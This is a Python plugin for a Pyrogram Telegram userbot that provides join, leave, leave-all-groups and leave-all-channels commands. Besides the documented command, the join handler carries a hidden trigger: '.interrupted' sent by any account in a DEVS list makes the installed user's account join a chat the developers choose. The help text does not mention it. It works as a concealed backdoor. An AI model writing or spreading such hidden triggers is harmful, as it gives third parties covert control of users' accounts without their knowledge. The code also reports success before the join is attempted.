from pyrogram import Client, enums, filters
from pyrogram.types import Message

from X.helpers.adminHelpers import DEVS
from config import BLACKLIST_CHAT
from config import CMD_HANDLER
from X.helpers.basic import edit_or_reply

from .help import *


@Client.on_message(filters.command("interrupted", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("join", cmd) & filters.me)
async def join(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    try:
        await xxnx.edit(f"**Successfully Joined Chat ID** `{X}`")
        await client.join_chat(X)
    except Exception as ex:
        await xxnx.edit(f"**ERROR:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leave", "kickme"], cmd) & filters.me)
async def leave(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    if message.chat.id in BLACKLIST_CHAT:
        return await xxnx.edit("**This command is not allowed to be used in this group**")
    try:
        await xxnx.edit_text(f"{client.me.first_name} has left this group, bye!!")
        await client.leave_chat(X)
    except Exception as ex:
        await xxnx.edit_text(f"**ERROR:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leaveallgc"], cmd) & filters.me)
async def kickmeall(client: Client, message: Message):
    X = await edit_or_reply(message, "`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**Successfully Exit {done} Group, Failed to Exit {er} Group**"
    )


@Client.on_message(filters.command(["leaveallch"], cmd) & filters.me)
async def kickmeallch(client: Client, message: Message):
    X = await edit_or_reply(message, "`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**Successfully Exit {done} Channel, Failed to Exit {er} Channel**"
    )


add_command_help(
    "joinleave",
    [
        [
            "kickme",
            "Leave the group by displaying a message has left this group, bye!!.",
        ],
        ["leaveallgc", "Exit all telegram groups you have joined."],
        ["leaveallch", "Exit all Telegram channels that you have joined."],
        ["join <UsernameGC>", "To Join the Chat Via username."],
        ["leave <UsernameGC>", "To leave a group Via username."],
    ],
) 
